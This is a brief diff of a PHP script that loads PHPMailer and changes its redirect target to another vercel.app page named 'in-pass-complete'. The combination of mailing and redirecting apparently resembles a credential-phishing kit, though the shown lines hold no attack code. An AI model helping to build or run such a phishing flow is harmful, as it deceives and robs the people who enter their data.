@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://in-to-use-in000.vercel.app/");
+header("Location:https://in-pass-complete.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
